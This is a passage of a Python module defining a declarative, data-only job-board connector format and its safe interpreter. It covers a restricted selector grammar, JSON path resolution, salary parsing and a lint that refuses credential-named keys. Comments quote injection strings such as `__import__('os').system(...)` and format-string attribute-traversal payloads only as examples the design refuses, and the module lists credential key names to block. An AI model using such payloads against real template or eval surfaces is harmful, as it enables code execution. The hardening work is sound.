"""Declarative connector format, and the interpreter that runs it (T32).

"A hundred candidates each writing a scraper for the same job board is a
collective waste" (owner, 2026-08-18). The fix the owner chose is a library
people can borrow from, and the property that makes borrowing safe is the
title of this module: **a connector is data, not code.** One YAML file per
site names a list URL pattern, a detail URL pattern, pagination, and a
selector per normalised `Offer` (T11) field. *We* interpret it — a connector
file never runs.

## Why data and not a plugin

Borrowing a plugin means running a stranger's code on the machine where a
candidate's whole profile lives. Borrowing a connector file means running
**our** interpreter over **their** selectors, and the worst a malicious
contribution can do is return wrong text. `connector_executes_no_shared_code`
is the assertion, made mechanical the same way `dimensions.py` makes "a
dimension may not invent fields" mechanical: a closed, `extra="forbid"`
schema, plus — beyond what a dimension needs — a hand-rolled selector grammar
that is matched against, never evaluated. Concretely, nothing in this module
ever calls `eval`, `exec`, `compile`, `__import__`, `getattr` on a
connector-supplied name, or a subprocess/shell function with connector-
supplied text; `yaml.safe_load` is the only loader used, so a `!!python/…`
tag is refused before it can construct anything; and neither of the two
connector-controlled brace grammars ever reaches `str.format`, because a
connector-controlled format string is its own attribute-access injection
vector even though it never reaches `eval` — a `url_pattern`'s only
placeholder is substituted with `str.replace`, and a `detail_url_template`'s
slots are found with a regex, each one checked against the same `JSON_PATH`
every other path in the file must satisfy, and the values spliced in by hand
(`_templated_url`), with a leftover brace refused at load either way.
`probe_connector_isolation`
below tries each of these routes and asserts every one is refused — "the
gate is the reason" this module exists in this shape.

## What a connector may not do

* **Invent a field.** `Connector.model_config = extra="forbid"`, at every
  nesting level, is the same rule dimensions.py enforces on `dimensions/*.yaml`
  (§5.2's "connectors may not invent fields") — a typo'd or smuggled key is a
  load-time `ConnectorError`, never a silently-ignored setting. The selector
  fields themselves are further restricted to a fixed vocabulary
  (`ALLOWED_OFFER_FIELDS`) naming exactly the `Offer` fields a markup selector
  could plausibly produce, so a field named `password` or `api_key` is
  rejected for not being one of them — before it is ever asked whether it
  *looks* like a credential.
* **Carry a credential.** There is no field anywhere in this schema for one.
  Authenticated sources drive the candidate's own browser session instead
  (spec-v2-process §2's step 7, Sourcing) — `auth: candidate_session` records
  that a site needs a signed-in session, and nothing more; see
  `AuthMode` and `test_authenticated_source_uses_the_candidate_session`.
  Two places in the schema are free-form enough to carry one anyway — a POST
  body's keys and a URL's query string — and `names_a_credential` lints both.
  For a long time it linted only the body, which is half a request: the
  board that motivated the rule, idealist.org, puts its credentials in the
  query string.
* **Run.** See above.

## What the format does not cover

Selectors run against markup that is already in the response. A site that
renders its listing or its ad body with JavaScript after load — many modern
boards — has nothing in that markup for a selector to match; this format
cannot reach it, and pretending otherwise would mean silently returning
nothing from a page that plainly has content. Such a site needs a heavier
mechanism (a headless browser) to justify itself later; it is not something a
connector file, however cleverly written, can be made to cover.

## Fetching is not this module's job

T12 is `[LAPTOP]` and owns turning a connector into HTTP requests against a
live site (a cloud session cannot reach one — 403 at the egress proxy,
confirmed 2026-08-15, per T11's module docstring). Everything here operates
on markup already in hand — a recorded fixture in a test, or, in T12's world,
a page T12 already fetched — via `parse_list_page` and `parse_detail_page`.

## Staleness

Every connector carries `version` and `last_verified`. `assess_staleness` and
`collect_listing` are how a caller learns that a connector has gone quiet
because nobody re-checked it, rather than because a search genuinely came back
empty — spec-v2-process's requirement that a stale connector is *reported*
stale rather than "quietly returning nothing".
"""

from __future__ import annotations

import json
import math
import re
import sys
from collections.abc import Callable, Iterator
from dataclasses import dataclass, field
from datetime import date
from functools import lru_cache
from html.parser import HTMLParser
from pathlib import Path
from typing import Any, Final, Literal
from urllib.parse import parse_qsl, quote, urlsplit

import yaml
from pydantic import BaseModel, ConfigDict, Field, ValidationError, field_validator, model_validator

from integral.dimensions import Language
from integral.offers import Location, Offer, Salary, compute_offer_id

_REPO_ROOT = Path(__file__).resolve().parents[2]
DEFAULT_CONNECTORS_DIR = _REPO_ROOT / "connectors"
# The one filename inside a connector package. Fixed, not derived: the package
# directory already carries the site name, and repeating it inside would give
# two places for it to disagree.
CONNECTOR_FILENAME = "connector.yaml"
META_FILENAME = "meta.yaml"
FIXTURE_DIRNAME = "fixture"

#: The connector's *second* capture of the same query, taken on a later day.
#: Beside `FIXTURE_DIRNAME` and never inside it: they are two reads at two
#: times, and one directory was the tautology `connector_health` exists to
#: avoid. Defined here so the contract and the health check cannot disagree
#: about what the directory is called.
PROBE_DIRNAME = "probe"
DEFAULT_EVIDENCE_PATH = _REPO_ROOT / "status" / "evidence" / "T32.json"

# A placeholder, not a policy: 90 days is a starting point the owner did not
# fix a number for. Kept as a parameter everywhere (never read as a bare
# constant deep in a call chain) so a future step spec can supply its own
# without this module changing.
DEFAULT_STALE_AFTER_DAYS = 90


class ConnectorError(Exception):
    """A connector file does not fit the declarative format, or cannot be
    interpreted safely — a load-time refusal, never a runtime crash deep in
    someone else's selector."""


class Strict(BaseModel):
    """Unknown keys are an error everywhere in this schema — see the module
    docstring's "may not invent a field"."""

    model_config = ConfigDict(extra="forbid", frozen=True)


SITE_NAME = re.compile(r"^[a-z][a-z0-9_]*$")
VERSION = re.compile(r"^\d+\.\d+\.\d+$")

# The `source` an offer carries when a general web search produced it rather
# than a connector (D-16). It is a reserved word in the `site` vocabulary, not
# merely a convention: `Connector` refuses it below, so no connector can ever
# claim the name, and `source` therefore stays a reliable answer to "where did
# this advert actually come from". Without the reservation, a connector called
# `web_search` would make the two indistinguishable in the stored record —
# which is the same confusion, one layer down, that D-16 is about.
SEARCH_SOURCE = "web_search"

# The whole vocabulary of things a connector may claim to extract: exactly the
# fields `integral.offers.Offer` (T11) can hold, flattened for the nested
# `location`/`salary` objects. Anything else — `password`, `cookie`, a
# scraper's own internal bookkeeping — is rejected at load by the field
# validators below, not merely left unused.
ALLOWED_OFFER_FIELDS = frozenset(
    {
        "title",
        "company",
        "url",
        "source_ref",
        "text",
        "location_raw",
        "location_country",
        "location_remote",
        "salary_min",
        "salary_max",
        "salary_currency",
        "salary_period",
    }
)
# `detail_url` is not an `Offer` field — it is the pointer from a list item to
# where the full ad lives — so it is added only for the list page's vocabulary.
LIST_FIELD_NAMES = ALLOWED_OFFER_FIELDS | {"detail_url"}

# The page's list-URL placeholder. Filled by `build_list_urls` via
# `str.replace`, never `str.format` — a connector-controlled format string
# would let `{0.__class__.__mro__[...]}`-style attribute access run before any
# `eval` is in the picture, so the placeholder is validated to be the only
# brace in the string and substituted literally.
PAGE_PLACEHOLDER = "{page}"

# The candidate's own search terms. Same substitution posture as `{page}` —
# `str.replace`, never `str.format` — and percent-encoded with `safe=""` at
# substitution so one encoder is correct whether the slot sits in a path
# segment or a query string. Without this a board's query is whatever its
# `url_pattern` was written with, so every candidate gets the same search.
QUERY_PLACEHOLDER = "{query}"
# ponytail: URL slot only. `list.body_json` still admits `{page}` alone, so a
# POST board carrying its search in the body (only `usajobs_en` today) cannot
# be steered yet — widen `_body_uses_only_the_page_placeholder` when a second
# one lands.

#: The `Content-Type` a JSON request body implies. Derived from the body's
#: declared form (`ListPage.body_json`) rather than being a header a connector
#: may set: a connector that could name headers could name `Authorization`,
#: and "a connector may not carry a credential" is a rule this schema keeps by
#: having nowhere to write one. See `build_list_requests`.
JSON_CONTENT_TYPE = "application/json"

#: Key names a request body may not use. Everywhere else in this schema "a
#: connector may not carry a credential" is kept structurally — there is no
#: field to write one in — but `body_json` is by necessity free-form data (a
#: board's search payload is the board's own vocabulary), so the rule needs a
#: check rather than an absence. This is admission lint and not a sandbox, the
#: same honesty `connector_contract`'s import allowlist states about itself: it
#: refuses a key that says what it is, and a determined contributor can call a
#: token `q`. What it does stop is the accident and the shrug — a board whose
#: payload really does want an `api_key` is a board this tool may not read, and
#: the refusal says so at load instead of after the secret is committed.
# ponytail: a name list, not a secret detector; entropy scanning of values is
# the upgrade path if a real key ever gets past this.
CREDENTIAL_KEY_TOKENS = frozenset(
    {
        "apikey",
        "auth",
        "authorization",
        "bearer",
        "cookie",
        "credential",
        "credentials",
        "csrf",
        "key",
        "pass",
        "passphrase",
        "passwd",
        "password",
        "pwd",
        "secret",
        "session",
        "token",
        "xsrf",
        # A signature or a one-time value is a credential the same way a token
        # is: possession of it is the whole authorisation.
        "hmac",
        "jwt",
        "nonce",
        "otp",
        "salt",
        "sig",
        "signature",
        # The identifier half of a credential *pair*. On its own it authorises
        # nothing, which is exactly why it reads as harmless and gets committed
        # — idealist.org's Algolia call carries an application id beside its
        # search key, and both were lifted from someone else's capture.
        "appid",
        "applicationid",
        "clientid",
        # Session cookies whose names are their own documentation.
        "aspxauth",
        "jsessionid",
        "phpsessid",
        "sessid",
    }
)

#: Words that are not a credential on their own but name one when they are
#: concatenated with a token above — `apitoken`, `privatekey`, `sessionid`.
#: Kept apart from the tokens so that a key called `id` or `user` is not
#: refused for existing.
CREDENTIAL_KEY_QUALIFIERS = frozenset(
    {
        "access",
        "api",
        "app",
        "client",
        "id",
        "private",
        "public",
        "refresh",
        "user",
        "x",
    }
)

#: `api_key`, `api-key`, `X-Api-Key`, `apiKey` — the separators a payload key
#: actually uses, plus the lowercase→uppercase boundary camelCase puts between
#: two words. A run of capitals (`SECRETKEY`) has no boundary to find, and
#: `apitoken` has no separator at all, which is what `_spells_a_credential`
#: below is for.
_KEY_SEPARATORS = re.compile(r"[^A-Za-z0-9]+|(?<=[a-z0-9])(?=[A-Z])")


@lru_cache(maxsize=4096)
def _spells_a_credential(word: str) -> bool:
    """Does this lowercase run of letters spell out a credential?

    A key may concatenate its words with nothing between them — `apitoken`,
    `secretkey`, `SECRETKEY` — so a separator-only split reads the whole thing
    as one unknown word and lets it through. `apikey` was already in the token
    list, which is the same class of hole patched one member at a time; this
    breaks the word instead.

    The break must be **total**: every piece has to be a word this module
    knows, and at least one of them a credential. That is what keeps `monkey`
    (`mon` is not a word here) and `keywords` (`words` is not) accepted while
    `secretkey` is refused — the alternative, a substring search, refuses
    every one of them.
    """
    vocabulary = CREDENTIAL_KEY_TOKENS | CREDENTIAL_KEY_QUALIFIERS
    # `broken[i]` — the ways `word[:i]` breaks cleanly into known words, as
    # "did any piece name a credential". Two states, so the walk stays linear
    # in the number of breakpoints rather than exploring every decomposition.
    broken: list[set[bool]] = [{False}] + [set() for _ in word]
    for end in range(1, len(word) + 1):
        for start in range(end):
            piece = word[start:end]
            if broken[start] and piece in vocabulary:
                names_one = piece in CREDENTIAL_KEY_TOKENS
                broken[end] |= {seen or names_one for seen in broken[start]}
    return True in broken[len(word)]


def names_a_credential(key: str) -> bool:
    """Does this key name a credential?

    Every contiguous run of the key's own words is tested, so a credential
    spelled across separators (`app_id`, `x-algolia-application-id`) is caught
    as well as one spelled inside a single word (`apitoken`).
    """
    words = [part for part in _KEY_SEPARATORS.split(key) if part]
    return any(
        _spells_a_credential("".join(words[start:end]).lower())
        for start in range(len(words))
        for end in range(start + 1, len(words) + 1)
    )


def credential_keys(node: Any) -> list[str]:
    """Every key anywhere in a parsed structure that names a credential."""
    if isinstance(node, dict):
        named = [key for key in node if isinstance(key, str) and names_a_credential(key)]
        return named + [key for value in node.values() for key in credential_keys(value)]
    if isinstance(node, list):
        return [key for item in node for key in credential_keys(item)]
    return []


def credential_query_keys(url: str) -> list[str]:
    """Every query-string key in `url` that names a credential.

    `url_pattern` is the *other* place a board's request can carry one, and
    for a long time nothing looked: the whole rule rested on `body_json`,
    which is only half of a request. idealist.org is the case that shows the
    half missing — its Algolia call puts both the application id and the
    search key in the query string, so a connector naming that URL carried a
    lifted credential past every check this module makes.
    """
    return [
        key
        for key, _ in parse_qsl(urlsplit(url).query, keep_blank_values=True)
        if names_a_credential(key)
    ]


# ---------------------------------------------------------------------------
# the selector grammar — a closed vocabulary, matched against, never evaluated


@dataclass(frozen=True)
class SimpleSelector:
    """One compiled selector: an optional tag, id, classes and attributes.

    This is the *entire* vocabulary a connector file can use to say "find me
    this element" — no combinators, no pseudo-classes, no expressions. It is
    intentionally too small a language to smuggle anything through: every
    character in a `css` string either belongs to one of these four token
    kinds or the selector is refused at load (`compile_selector`).
    """

    tag: str | None
    id_: str | None
    classes: tuple[str, ...]
    attrs: tuple[tuple[str, str | None], ...]


_TAG_TOKEN = re.compile(r"^[a-zA-Z][\w-]*")
_OTHER_TOKEN = re.compile(r"#[\w-]+|\.[\w-]+|\[[a-zA-Z_][\w-]*(?:=(?:\"[^\"]*\"|'[^']*'))?\]")


def compile_selector(css: str) -> SimpleSelector:
    """Parse a `css` string into `SimpleSelector`, or raise `ConnectorError`.

    Every character must be consumed by one of the three token kinds
    (`#id`, `.class`, `[attr]`/`[attr="value"]`) after an optional leading tag
    name; anything left over — parentheses, quotes outside an attribute
    bracket, semicolons, whitespace, a combinator — is refused. This is what
    makes a selector like `__import__('os').system('x')` inert: it simply
    fails to parse (it is not one of the four token kinds), the same way it
    would if a human mistyped it. Nothing here ever calls `eval` on the
    string; refusal is a plain regex-driven consumption check.

    Tag names and attribute *names* are lowercased here, once, at compile
    time — never left as typed. HTML tag and attribute names are
    case-insensitive by spec, and `html.parser.HTMLParser` already lowercases
    both when it builds a `Node` (verified: `<DIV DISABLED>` tokenises to
    `tag="div"`, `attrs={"disabled": ...}`). Without this normalisation a
    selector written `DIV.job-card` or `[DISABLED]` — exactly what a
    non-programmer hand-editing a connector is liable to type — compiles
    without error and then simply never matches anything: no exception at
    load, no exception at parse, just a silently empty result, which is the
    worst possible failure mode for someone who cannot read this module to
    find out why. Attribute *values*, class names, and ids are left exactly
    as written: those ARE case-sensitive in HTML (`[data-x="Foo"]` must not
    match `data-x="foo"`, and `.Job` must not match `class="job"`), so
    lowercasing them would silently break a correctly-written connector
    instead of fixing a broken one.
    """
    text = css.strip()
    if not text:
        raise ConnectorError("empty selector")
    tag_match = _TAG_TOKEN.match(text)
    tag = tag_match.group(0).lower() if tag_match else None
    rest = text[tag_match.end() :] if tag_match else text

    id_: str | None = None
    classes: list[str] = []
    attrs: list[tuple[str, str | None]] = []
    position = 0
    for match in _OTHER_TOKEN.finditer(rest):
        if match.start() != position:
            raise ConnectorError(f"selector is not tag/#id/.class/[attr]: {css!r}")
        token = match.group(0)
        if token.startswith("#"):
            if id_ is not None:
                raise ConnectorError(f"selector names more than one id: {css!r}")
            id_ = token[1:]
        elif token.startswith("."):
            classes.append(token[1:])
        else:
            body = token[1:-1]
            name, _, value = body.partition("=")
            # Only the attribute *name* is case-insensitive HTML syntax; the
            # value (when present) is data and stays exactly as written.
            attrs.append((name.lower(), value.strip("\"'")) if value else (name.lower(), None))
        position = match.end()
    if position != len(rest):
        raise ConnectorError(f"selector is not tag/#id/.class/[attr]: {css!r}")
    if tag is None and id_ is None and not classes and not attrs:
        raise ConnectorError(f"empty selector: {css!r}")
    return SimpleSelector(tag=tag, id_=id_, classes=tuple(classes), attrs=tuple(attrs))


# ---------------------------------------------------------------------------
# a minimal, inert HTML tree — stdlib `html.parser`, nothing executed


_VOID_TAGS = frozenset(
    {
        "area",
        "base",
        "br",
        "col",
        "embed",
        "hr",
        "img",
        "input",
        "link",
        "meta",
        "param",
        "source",
        "track",
        "wbr",
    }
)


@dataclass
class Node:
    """One element in a parsed page. `<script>`/`<style>` content lands here
    exactly like any other text — it is stored, matched against selectors like
    any other node, and never executed; there is no interpreter for it to run
    in."""

    tag: str
    attrs: dict[str, str]
    children: list[Node | str] = field(default_factory=list)

    def matches(self, selector: SimpleSelector) -> bool:
        if selector.tag is not None and self.tag != selector.tag:
            return False
        if selector.id_ is not None and self.attrs.get("id") != selector.id_:
            return False
        node_classes = set(self.attrs.get("class", "").split())
        if not set(selector.classes).issubset(node_classes):
            return False
        for name, value in selector.attrs:
            if name not in self.attrs:
                return False
            if value is not None and self.attrs[name] != value:
                return False
        return True

    def iter_descendants(self) -> Iterator[Node]:
        for child in self.children:
            if isinstance(child, Node):
                yield child
                yield from child.iter_descendants()

    def text_content(self) -> str:
        pieces = [piece for piece in self._iter_text() if piece.strip()]
        return " ".join(" ".join(piece.split()) for piece in pieces).strip()

    def raw_text(self) -> str:
        """Every text piece beneath this node, concatenated unchanged.

        `text_content` is for prose read out of markup, where collapsing runs
        of whitespace is what a reader means by "the text". This is for a node
        whose text is a *document* — a `<script>` holding JSON — where
        collapsing is corruption: whitespace between JSON tokens does not
        matter, but whitespace inside a string value does, and an advert body
        is a string value. `Offer.text` is required to be what the board
        published (T11 keeps it byte-for-byte because extraction evidence spans
        are offsets into it), so a description written with a double space must
        still have it after the round trip.

        Caught by review on the PR that introduced the JSON route: the first
        implementation read these documents through `text_content` and silently
        reflowed every advert body it parsed.
        """
        return "".join(self._iter_text())

    def _iter_text(self) -> Iterator[str]:
        for child in self.children:
            if isinstance(child, str):
                yield child
            else:
                yield from child._iter_text()


class _TreeBuilder(HTMLParser):
    """Builds a `Node` tree. Malformed markup degrades gracefully — an
    unclosed tag is simply never popped, and the document root always closes
    its own children — the same tolerance a browser's parser has, needed
    because a "recorded fixture" is exactly the kind of imperfect real-world
    HTML this has to survive."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.root = Node(tag="[document]", attrs={})
        self._stack: list[Node] = [self.root]

    def _attrs_dict(self, attrs: list[tuple[str, str | None]]) -> dict[str, str]:
        return {name: (value if value is not None else "") for name, value in attrs}

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        node = Node(tag=tag, attrs=self._attrs_dict(attrs))
        self._stack[-1].children.append(node)
        if tag not in _VOID_TAGS:
            self._stack.append(node)

    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self._stack[-1].children.append(Node(tag=tag, attrs=self._attrs_dict(attrs)))

    def handle_endtag(self, tag: str) -> None:
        for index in range(len(self._stack) - 1, 0, -1):
            if self._stack[index].tag == tag:
                del self._stack[index:]
                return

    def handle_data(self, data: str) -> None:
        if data:
            self._stack[-1].children.append(data)


def parse_html(html: str) -> Node:
    """Turn a page of markup into a `Node` tree. `HTMLParser` tokenises;
    nothing it produces is ever executed — every tag becomes a `Node`, every
    run of text becomes a string, full stop."""
    builder = _TreeBuilder()
    builder.feed(html)
    builder.close()
    return builder.root


def select_first(root: Node, selector: SimpleSelector) -> Node | None:
    """The first descendant of `root` matching `selector`, in document order,
    or `None`."""
    for node in root.iter_descendants():
        if node.matches(selector):
            return node
    return None


def select_all(root: Node, selector: SimpleSelector) -> list[Node]:
    """Every descendant of `root` matching `selector`, in document order."""
    return [node for node in root.iter_descendants() if node.matches(selector)]


# ---------------------------------------------------------------------------
# the schema


AuthMode = Literal["none", "candidate_session"]


#: The closed vocabulary of *partial* extractions (T132, issue #356).
#:
#: A selector could already name an element and an attribute, and neither can
#: name a **part** of what it found. Two boards are blocked on exactly that:
#: `landing.jobs` writes a whole salary band into one span
#: (`€50.000 - €65.000`) and `arbeitsagentur.de` writes `1.&nbsp;Python
#: Entwickler (m/w/d)` into every title it offers.
#:
#: The obvious answer — let the connector supply a regex — is the one thing
#: this grammar exists to exclude: it is connector-supplied code, and a
#: pathological pattern is a denial of service before it is anything else. So
#: every member below is a **name** whose behaviour lives in `_take`, and the
#: connector supplies no pattern, no template and no index.
#:
#: Each is fail-closed. Text that does not have the shape the name describes
#: yields **nothing**, never the unparsed string — the negative control #356
#: asks for, and the direction that matters: a missing salary is a gap a
#: candidate can see, while `50.000 - 65.000` landing in `salary_min` is a
#: number that is simply wrong and looks fine.
Take = Literal["range_low", "range_high", "currency", "last_text_node"]

#: Currency tokens recognised by `take: currency`, symbol or ISO code. A closed
#: table for the same reason the vocabulary is closed, and deliberately small:
#: a board using something absent from it reports no currency, which
#: `build_offer` reads as no stated salary — not a guess.
_CURRENCIES: dict[str, str] = {
    "€": "EUR",
    "EUR": "EUR",
    "$": "USD",
    "USD": "USD",
    "£": "GBP",
    "GBP": "GBP",
    "ZŁ": "PLN",
    "PLN": "PLN",
    "CHF": "CHF",
    "SEK": "SEK",
    "NOK": "NOK",
    "DKK": "DKK",
    "CAD": "CAD",
    "AUD": "AUD",
}

#: A run that could be one number in either thousands convention, with an
#: optional magnitude suffix. Deliberately not anchored to a currency: boards
#: write `€50.000`, `50.000€` and `50.000 EUR`, and the number is the same in
#: all three.
_NUMBER = re.compile(r"(\d[\d.,]*)\s*([KkMm])?")

#: `CAD 150K-190K` — foorilla.com's whole salary column is written this way, and
#: reading it as 150 to 190 is the 1000x error `_as_float` exists to refuse,
#: arriving by a different door. Only these two, and only immediately after the
#: figure: a `k` elsewhere in the sentence is not a multiplier.
_MAGNITUDE = {"k": 1_000, "m": 1_000_000}


def _numbers_in(text: str) -> list[float]:
    """Every number in `text` that `_as_float` can resolve **without guessing**.

    A run it refuses is dropped rather than approximated, which is what makes
    "exactly two" a real test: a band whose halves are written in different
    conventions resolves to fewer than two numbers and the field is left empty.
    """
    found = []
    for run, magnitude in _NUMBER.findall(text):
        # A trailing separator is the sentence's punctuation, not the number's:
        # `hasta €65.000, desde €50.000` matches `65.000,`, which `_as_float`
        # rightly refuses as an unresolvable convention — and a refusal here
        # silently costs the whole band, since "exactly two" then finds one.
        number = _as_float(run.rstrip(".,"))
        if number is None:
            continue
        found.append(number * _MAGNITUDE[magnitude.lower()] if magnitude else number)
    return found


def _take(take: Take, value: str) -> str | None:
    """Apply one member of the vocabulary. `None` means "this text is not that".

    Never returns `value` unchanged: a `take` that cannot do its job must not
    look like a `take` that was not asked for.
    """
    if take in ("range_low", "range_high"):
        numbers = _numbers_in(value)
        # Exactly two. One number is a single figure and not a band; three or
        # more is a string this vocabulary does not understand — an hourly rate
        # beside an annual band, a date, a headcount. Guessing which two were
        # meant is how a wrong salary reaches a ranking.
        if len(numbers) != 2:
            return None
        low, high = min(numbers), max(numbers)
        return _number_text(low if take == "range_low" else high)
    if take == "currency":
        seen = {code for token, code in _CURRENCIES.items() if token in value.upper()}
        # One currency, or none. A text naming two is a conversion or a
        # comparison, and either way nobody can say which one the pay is in.
        return seen.pop() if len(seen) == 1 else None
    return value


def _number_text(number: float) -> str:
    """A parsed number back as the plain text the field vocabulary carries.

    Every extraction in this module is `str`; `build_offer` is what turns the
    salary fields into numbers, and it re-reads them with the same `_as_float`.
    Rendering without a thousands separator is what keeps that round trip
    lossless in either convention.
    """
    return str(int(number)) if number == int(number) else repr(number)


class FieldSelector(Strict):
    """One field's extraction rule: where to look, and what to take from the
    match. This is the entire per-field vocabulary — a selector plus an
    optional attribute name — precisely so there is no field here for a
    template, a regex substitution, or anything else that would need to run
    connector-supplied code to apply."""

    css: str = Field(min_length=1)
    attr: str | None = None
    #: Which *part* of the matched value to keep. A closed vocabulary, not an
    #: expression: every member is implemented here, so a connector names one
    #: and supplies no pattern of its own. See `Take` and `_take`.
    take: Take | None = None

    @model_validator(mode="after")
    def _take_and_attr_are_compatible(self) -> FieldSelector:
        if self.take == "last_text_node" and self.attr is not None:
            raise ValueError(
                "take: last_text_node reads the element's text, so it cannot be "
                "combined with attr — pick one"
            )
        return self

    @field_validator("css")
    @classmethod
    def _selector_compiles(cls, css: str) -> str:
        # Refused here, at load, not merely left unused at parse time — an
        # unusable or smuggled selector is a defect in the file, not a
        # runtime surprise for whoever later calls `parse_detail_page`.
        try:
            compile_selector(css)
        except ConnectorError as exc:
            raise ValueError(str(exc)) from exc
        return css


# ---------------------------------------------------------------------------
# the JSON path vocabulary — the second, smaller grammar
#
# Several boards keep their cleanest data in JSON and render a messier HTML
# view of the same facts (`connectors/ruled-out.yaml`, `engine_gap_json`).
# justjoin.it is the extreme case: its listing carries no advert markup at all,
# and each advert's own page carries a schema.org `JobPosting` with `minValue`
# and `maxValue` as *numbers*.
#
# That last part is why this exists and is not merely a convenience. The
# recurring hazard in this library is `build_offer` constructing
# `Salary(stated=True)` out of strings `_as_float` cannot read — six HTML
# connectors leave salary unmapped for exactly that reason. A JSON number needs
# no splitting, so the field it produces is either a real figure or nothing.

#: One key segment: what every segment of this grammar was, before T118.
_JSON_PATH_KEY = r"[A-Za-z_@][\w@-]*"

#: One index segment, in exactly one spelling: no sign, no leading zero, no
#: separators, no `+`. `01` is a second spelling of `0` and `1_0` is not a
#: number, so neither is an index here — they are refused at load rather than
#: resolved to nothing at parse time.
_JSON_PATH_INDEX = r"0|[1-9][0-9]*"

#: A dotted path of object keys and array indices. No wildcards, no filters, no
#: expression syntax — the same "too small to smuggle anything through"
#: discipline as `SimpleSelector`, and for the same reason: a path is consumed
#: against this regex and never evaluated.
#:
#: T118 added the index segment, because `locations.0` was the only way to
#: reach getmanfred's physical city and the grammar had no room for it. What
#: the change decides is which spellings are **refused**, and the three rules
#: below are stated here so none of them has to be discovered from `dig`:
#:
#: * `locations.0` is the one spelling. `locations[0]` is bracket syntax this
#:   grammar does not have, `locations.-1` is a negative index, and
#:   `locations.01` is a second spelling of the first. All three are refused.
#: * An index segment indexes a **sequence and nothing else**. A dict whose key
#:   is literally `"0"` is unreachable by this grammar: `locations.0` means
#:   element 0, always. A board that keeps numeric string keys is a board this
#:   library declines to describe, which is the same posture the grammar takes
#:   toward every other shape it cannot name.
#: * The **first** segment is always a key. A path names a field of a record,
#:   and a bare leading index is also `str.format`'s positional syntax — the
#:   very thing `compile_url_template` refuses a `{0}` slot for. `$` stays the
#:   only way to name the document itself.
JSON_PATH = re.compile(rf"^{_JSON_PATH_KEY}(?:\.(?:{_JSON_PATH_KEY}|{_JSON_PATH_INDEX}))*$")

#: Which segments `_resolve` reads as indices. Compiled from the same source as
#: the grammar above, so a segment can never be admitted by one and read by the
#: other: a key segment must start with a letter, `_` or `@`, so no key can be
#: mistaken for an index, and no index for a key.
_INDEX_SEGMENT = re.compile(rf"(?:{_JSON_PATH_INDEX})")

#: The one path that is not a key: the document itself. An API whose response
#: *is* the array of adverts — workingnomads, remoteok — has no key to name, and
#: `items: "$"` says so out loud rather than by leaving the field blank, which
#: is what a typo looks like. It cannot collide with a real key: `JSON_PATH`
#: requires a letter, an underscore or an `@` first.
JSON_ROOT = "$"


#: A `{...}` slot in `detail_url_template`. Only the brace pair is matched
#: here; whatever is inside it must still satisfy `JSON_PATH` via
#: `compile_path`, so the template borrows the same grammar as every other
#: path in a connector rather than introducing a second one.
URL_TEMPLATE_SLOT = re.compile(r"\{([^{}]*)\}")


def compile_url_template(template: str) -> tuple[tuple[str, ...], ...]:
    """The paths a `detail_url_template` reads, refusing anything else.

    Two separate refusals, because they fail differently. A slot whose
    contents are not a `JSON_PATH` is a typo the author should see at load
    time. A brace left over after every slot is removed is the dangerous one:
    `str.format` over a template this module did not fully parse is an
    attribute-traversal surface (`{0.__class__.__init__.__globals__}`), and
    the way to close it is to refuse the character rather than to promise
    never to call `format`. `url_pattern` already takes exactly this posture
    toward `{page}`.
    """
    paths = tuple(compile_path(slot) for slot in URL_TEMPLATE_SLOT.findall(template))
    residue = URL_TEMPLATE_SLOT.sub("", template)
    if "{" in residue or "}" in residue:
        raise ConnectorError(f"unbalanced or nested braces in detail_url_template: {template!r}")
    # `not all(paths)` is the `{$}` case, and it is the same fault as the empty
    # one: `compile_path` maps `JSON_ROOT` to the empty path, `dig(record, ())`
    # is `None` for any dict row, so a template carrying it names a field the
    # way `$` names a document — which is to say not at all — and quietly gives
    # every row no `detail_url` while looking like it composes one.
    if not paths or not all(paths):
        raise ConnectorError(
            f"detail_url_template names no field, so every row would get the same URL: {template!r}"
        )
    return paths


def compile_path(path: str) -> tuple[str, ...]:
    """`"baseSalary.value.minValue"` → `("baseSalary", "value", "minValue")`.

    Refused by consuming the whole string against `JSON_PATH`, never by
    `eval`, `jsonpath` or any other evaluator.
    """
    if path == JSON_ROOT:
        return ()
    if not JSON_PATH.match(path):
        raise ConnectorError(f"unsupported JSON path: {path!r}")
    return tuple(path.split("."))


#: "The path led nowhere", distinct from "the path led to `null`". Both are a
#: miss for `dig`, but the walk itself must tell them apart or an index into a
#: document holding `null` would keep walking.
_MISSING: Final = object()


def _resolve(document: Any, path: tuple[str, ...]) -> Any:
    """Walk `path` and return the node it names, or `_MISSING`.

    One walker for both readers below, so the grammar has exactly one
    interpretation. A key segment reads a mapping; an index segment reads a
    **list**, and only a list — indexing a string would make `title.0` return
    its first letter, and indexing a mapping would make `locations.0` mean two
    different things depending on the document it is applied to.

    Every way out of range is the same miss: there is no negative index in the
    grammar, so nothing wraps around, and an index past the end returns
    `_MISSING` rather than raising.
    """
    node: Any = document
    for segment in path:
        if _INDEX_SEGMENT.fullmatch(segment):
            index = int(segment)
            if not isinstance(node, list) or index >= len(node):
                return _MISSING
            node = node[index]
            continue
        if not isinstance(node, dict) or segment not in node:
            return _MISSING
        node = node[segment]
    return node


def dig(document: Any, path: tuple[str, ...]) -> str | None:
    """Follow `path` through nested objects and arrays; return the scalar at the end.

    `None` for anything else — a missing key, an index past the end of an
    array, a `null`, or a path that lands on an object or an array.
    **Landing on a container is treated as a miss, not as a value**:
    `str({...})` would hand `build_offer` a Python repr as though the board had
    published it, and for a salary key that is the difference between "no
    figure" and `Salary(stated=True)` carrying `"{'@type': ...}"`. That rule is
    unchanged by indexing, and is why `locations` still reads as absent while
    `locations.0` reads as a city. A `bool` is likewise not a value here;
    JSON's `true` is not a wage, a title or a body.
    """
    node = _resolve(document, path)
    if node is _MISSING or isinstance(node, bool) or not isinstance(node, (str, int, float)):
        return None
    return str(node)


def dig_container(document: Any, path: tuple[str, ...]) -> list[Any]:
    """The array `path` names, or an empty list.

    Deliberately the opposite acceptance to `dig`: here a scalar is the miss
    and the array is the value. An empty list for a path that does not lead to
    one — a list page that parses to nothing is what `collect_listing` already
    reports as a staleness signal, and inventing a single-element list out of
    whatever was found would hide exactly that.
    """
    node = _resolve(document, path)
    return node if isinstance(node, list) else []


def _present(value: str | None) -> bool:
    """One rule for "this record actually carries that field".

    `dig` already answers `None` for a missing key, a `null` and a container.
    What it cannot know is that a board publishes the empty string, or a run
